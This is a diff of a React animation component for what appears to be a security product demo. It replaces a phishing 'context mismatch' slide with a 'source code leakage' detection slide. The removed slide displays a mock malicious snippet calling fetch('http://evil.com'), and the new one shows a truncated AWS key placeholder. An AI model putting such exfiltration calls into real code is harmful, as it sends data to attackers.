@@ -1,83 +1,68 @@
 import { motion } from 'framer-motion';
-import { FileText, AlertTriangle, Unlink } from 'lucide-react';
+import { Code, ShieldAlert } from 'lucide-react';
 
 export function Scene5() {
   return (
-    <motion.div 
+    <motion.div
       className="absolute inset-0 flex flex-col items-center justify-center z-20"
-      initial={{ opacity: 0 }}
-      animate={{ opacity: 1 }}
+      initial={{ clipPath: 'circle(0% at 50% 50%)' }}
+      animate={{ clipPath: 'circle(150% at 50% 50%)' }}
       exit={{ opacity: 0 }}
-      transition={{ duration: 0.8 }}
+      transition={{ duration: 1, ease: [0.4, 0, 0.2, 1] }}
     >
-      <motion.div
-        initial={{ y: -30, opacity: 0 }}
-        animate={{ y: 0, opacity: 1 }}
-        transition={{ delay: 0.2 }}
-        className="text-center mb-[8vh]"
-      >
-        <h1 className="text-5xl font-bold font-display mb-4">Subject-Body <span className="text-orange-400">Context Mismatch</span></h1>
-        <p className="text-2xl text-orange-200/80 mb-2 font-mono">제목-내용 맥락 불일치 탐지</p>
-        <p className="text-xl font-mono text-slate-400">파일 제목과 본문 의미 불일치로 피싱·위장 판단</p>
-      </motion.div>
+      <div className="text-center mb-[8vh]">
+        <h1 className="text-7xl font-bold mb-4 font-display">
+          Source Code <span className="text-purple-400">Leakage</span>
+        </h1>
+        <p className="text-2xl text-purple-200/80 font-mono">소스코드 유출 탐지</p>
+      </div>
 
-      <div className="flex items-center gap-[2vw] relative w-full max-w-5xl justify-center">
-        {/* Subject Card */}
+      <div className="relative w-full max-w-5xl h-[30vh] bg-[#0d1117] rounded-xl border border-slate-700 p-[2vw] overflow-hidden flex items-center shadow-2xl">
+        <motion.div
+          className="absolute inset-0 opacity-20"
+          initial={{ backgroundPosition: '0% 0%' }}
+          animate={{ backgroundPosition: '100% 100%' }}
+          transition={{ duration: 10, repeat: Infinity, ease: 'linear' }}
+          style={{ backgroundImage: 'radial-gradient(#a855f7 1px, transparent 1px)', backgroundSize: '20px 20px' }}
+        />
+
         <motion.div
           initial={{ x: -100, opacity: 0 }}
           animate={{ x: 0, opacity: 1 }}
-          transition={{ delay: 0.6, type: 'spring' }}
-          className="bg-slate-800 border border-slate-700 w-[20vw] p-[1.5vw] rounded-xl relative shadow-lg"
+          transition={{ delay: 0.5 }}
+          className="z-10 flex gap-[1vw] text-purple-400 font-mono text-xl"
         >
-          <div className="text-xs text-slate-400 mb-2 uppercase tracking-wider">File Subject</div>
-          <div className="flex items-center gap-3 text-xl font-bold text-white">
-            <FileText className="text-blue-400" />
-            Salary_Report.pdf
+          <div>
+            <p>1</p><p>2</p><p>3</p>
+          </div>
+          <div>
+            <p><span className="text-pink-400">const</span> AWS_KEY = <span className="text-green-400">'AKIA...'</span>;</p>
+            <p><span className="text-pink-400">function</span> <span className="text-blue-400">connectDB</span>() {'{'}</p>
+            <p className="ml-4"><span className="text-pink-400">return</span> db.<span className="text-blue-400">auth</span>(AWS_KEY);</p>
           </div>
         </motion.div>
 
-        {/* Separator / AI Analysis */}
         <motion.div
-          initial={{ scale: 0 }}
-          animate={{ scale: 1 }}
-          transition={{ delay: 1.4, type: 'spring' }}
-          className="z-10 bg-red-500 rounded-full p-4 shadow-[0_0_30px_rgba(239,68,68,0.5)]"
+          initial={{ scale: 5, opacity: 0 }}
+          animate={{ scale: 1, opacity: 1 }}
+          transition={{ delay: 1.5, type: 'spring', bounce: 0.5 }}
+          className="absolute right-[3vw] top-1/2 -translate-y-1/2 text-red-500 flex flex-col items-center bg-black/80 p-[1.5vw] rounded-2xl border-2 border-red-500 backdrop-blur-md"
         >
-          <Unlink size={40} className="text-white" />
-        </motion.div>
-
-        {/* Body Card */}
-        <motion.div
-          initial={{ x: 100, opacity: 0 }}
-          animate={{ x: 0, opacity: 1 }}
-          transition={{ delay: 0.8, type: 'spring' }}
-          className="bg-slate-800 border border-red-900/50 w-[20vw] p-[1.5vw] rounded-xl relative shadow-lg overflow-hidden"
-        >
-          <motion.div 
-            className="absolute inset-0 bg-red-500/10"
-            animate={{ opacity: [0.1, 0.3, 0.1] }}
-            transition={{ duration: 2, repeat: Infinity }}
-          />
-          <div className="text-xs text-slate-400 mb-2 uppercase tracking-wider">File Content</div>
-          <div className="text-sm font-mono text-red-300">
-            [MALICIOUS SCRIPT]<br/>
-            function drop() {'{'}<br/>
-            &nbsp;&nbsp;fetch('http://evil.com')<br/>
-            {'}'}
-          </div>
-        </motion.div>
-        
-        {/* Alert badge */}
-        <motion.div
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ delay: 2 }}
-          className="absolute bottom-[1vh] left-1/2 -translate-x-1/2 bg-red-950/80 border border-red-500 px-[1.5vw] py-[0.75vw] rounded-full flex items-center gap-[0.75vw] text-red-400 font-bold"
-        >
-          <AlertTriangle size={24} />
-          MISMATCH DETECTED
+          <ShieldAlert size={64} className="mb-2" />
+          <span className="font-bold text-xl tracking-widest uppercase">LEAK DETECTED</span>
         </motion.div>
       </div>
+
+      <motion.div
+        initial={{ opacity: 0, y: 20 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ delay: 2, duration: 0.8 }}
+        className="mt-12 text-center"
+      >
+        <p className="text-2xl font-mono text-slate-300">
+          코드 패턴·언어 특성 기반 소스코드 외부 유출 탐지
+        </p>
+      </motion.div>
     </motion.div>
   );
 }
